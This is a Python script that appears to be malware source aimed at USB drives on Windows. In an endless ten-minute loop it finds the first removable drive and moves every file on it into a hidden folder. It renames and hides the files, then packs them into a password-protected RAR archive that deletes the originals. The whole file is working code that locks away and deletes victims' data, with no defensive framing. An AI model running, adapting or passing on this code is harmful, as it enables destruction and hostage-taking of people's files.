import psutil
import os
import shutil
from random import randint
import win32con, win32api
from time import sleep
import sys
from subprocess import run

disklist = psutil.disk_partitions()
upan = []
file_list = []
workdir = "queen".title() + str(randint(1, 145))
password_base64 = r"cXVlZW5fdmlydXMucHlfZm9yX3VzYg=="

def resource_path(relative_path):
    if getattr(sys, 'frozen', False): #是否Bundle Resource
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def find_upan():
    for x in disklist:
        if x.opts.split(",")[1] == 'removable':
            upan.append(x)

def all_path(dirname):
    result = []
    for maindir, subdir, file_name_list in os.walk(dirname):
        for filename in file_name_list:
            apath = os.path.join(maindir, filename)
            if os.path.isabs(apath) and os.path.exists(apath):
                result.append(apath)
                if not apath in file_list:
                    file_list.append(apath)
    return result

def hide(file):
    if os.path.exists(file):
        # win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_SYSTEM)
        win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_HIDDEN)
        # win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_READONLY)
    pass
    #

def operation():
    if not os.path.exists(upan[0].device + workdir):
        os.mkdir(upan[0].device + workdir)
    hide(upan[0].device + workdir)
    for x in file_list:
        if not os.path.basename(x) in os.listdir(upan[0].device + workdir):
            try:
                shutil.move(x, upan[0].device + workdir)
            except:
                pass
        else :
            # shutil.move(x, upan[0].device + workdir+r"\\"+"@"+random.randint(1,100)+x)
            pass
            # os.renames(x,os.path.splitext(x)[0]+".queen")
    for a in all_path(upan[0].device + workdir):
        # print(upan[0].device + workdir+"\\"+os.path.basename(a).split(".")[0]+".Queen")
        # print(a, os.path.splitext(a)[0] + ".queen".title())
        if not os.path.exists(upan[0].device + workdir+"\\"+os.path.basename(a).split(".")[0]+".Queen") :
            try:
                os.renames(a, os.path.splitext(a)[0] + ".queen".title())
                hide(os.path.splitext(a)[0] + ".queen".title())
            except:
                pass
    pass

def rar(rarpath):
    # print(rarpath,password_base64,upan[0].device+"QUEEN.RAR",upan[0].device+workdir)
    run("{0} a -r -m0 -k -df -p{1} {2} {3}".format(rarpath,password_base64,upan[0].device+"QUEEN{0}.RAR".format(randint(3,76)),upan[0].device+workdir),shell=True)
    try:
        os.rmdir(upan[0].device + workdir)
    except :
        pass
filepath = resource_path(os.path.join("data","Rar.exe"))
# find_upan()


while True:
    find_upan()
    all_path(upan[0].device)
    operation()
    rar(filepath)
    # print("wait")
    sleep(600)

